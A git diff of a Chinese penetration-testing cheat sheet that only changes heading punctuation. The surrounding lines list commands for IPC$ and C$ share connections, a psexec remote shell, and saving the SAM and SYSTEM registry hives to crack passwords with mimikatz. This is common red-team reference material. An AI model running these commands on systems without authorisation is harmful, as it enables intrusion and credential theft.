@@ -151,7 +151,7 @@ namp
 `-A 10.1.1.1` 全面扫描  
 `-oN d:\result.txt` 保存txt  
 
-- ## IPC$,445
+- ## IPC$,445:  
 `net use \\[ip]\ipc$ [密码] /user:[用户]` 创建ipc$连接  
 `net use z: \\[ip]\c$ [密码] /user:[用户]` c$映射到z:  
 `net use z: /del` 删除连接   
@@ -160,7 +160,7 @@ namp
 `net share ipc$ /del` 删除ipc$  
 `./psexec.exe \\[ip] -u [username] -p [password] -i cmd` psexec远程获取shell  `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken` 筛选管理员令牌
 
-- ## SAM破解密码  
+- ## SAM破解密码:  
 `reg save hklm\sam sam.hive` 抓取SAM文件  
 `reg save hklm\system system.hive` 抓取SYSTEM文件  
 将sam.hive和system.hive文件放在mimikatz.exe同一目录下  
